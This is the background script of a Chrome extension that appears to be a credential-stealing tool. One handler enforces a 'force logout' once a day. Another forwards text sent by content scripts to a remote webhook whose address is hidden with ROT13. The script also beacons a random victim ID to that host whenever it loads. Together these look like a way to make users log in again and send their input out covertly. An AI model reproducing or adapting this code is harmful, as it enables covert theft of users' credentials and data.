const rot13 = (message) => {
    const originalAlpha =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
    return message.replace(
        /[a-z]/gi,
        (letter) => cipher[originalAlpha.indexOf(letter)]
    );
};

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    console.log(
        sender.tab
            ? "from a content script:" + sender.tab.url
            : "from the extension"
    );
    if (request.req == "deauther") {
        console.log(Date.now() - last_force_logout);
        if (Date.now() - last_force_logout > 1000 * 60 * 60 * 24) {
            last_force_logout = Date.now();
            sendResponse({ doit: "true" });
            console.log(true);
        } else {
            sendResponse({ doit: "false" });
            console.log(false);
        }
    } else if (request.req == "send"){
        wh = rot13(
            "uggcf://guryvbafebne.pu/qp_sbejneq"
        );
        console.log(1)
        fetch(wh, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: request.text,
            }),
        });
    }
});

var last_force_logout = null;

function init() {
    if (last_force_logout == null) {
        chrome.storage.local.get(["last_force_logout"], function (result) {
            last_force_logout = result.last_force_logout;
            if (last_force_logout == null) {
                last_force_logout = 0;
            }
            console.log("Value currently is " + result.last_force_logout);
        });
    }
    setInterval(() => {
        chrome.storage.local.set(
            { last_force_logout: last_force_logout },
            function () {
                // console.log("Value is set to " + last_force_logout);
            }
        );
    }, 1000);
    console.log('e')
    chrome.storage.local.get(["customId"], function (result) {
        console.log(result);
        customId = result.customId;
        if (customId == null) {
            customId = Math.floor(Math.random()*256);
        }
        console.log("Value currently is " + customId);
        let text = "ID: "+customId;
        wh = rot13(
            "uggcf://guryvbafebne.pu/qp_sbejneq"
        );
        console.log(wh)
        fetch(wh, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: text+" Loaded in",
            }),
        });
        chrome.storage.local.set(
            { customId: customId },
            function () {
                // console.log("Value is set to " + customId);
            }
        );
    });
}

init();
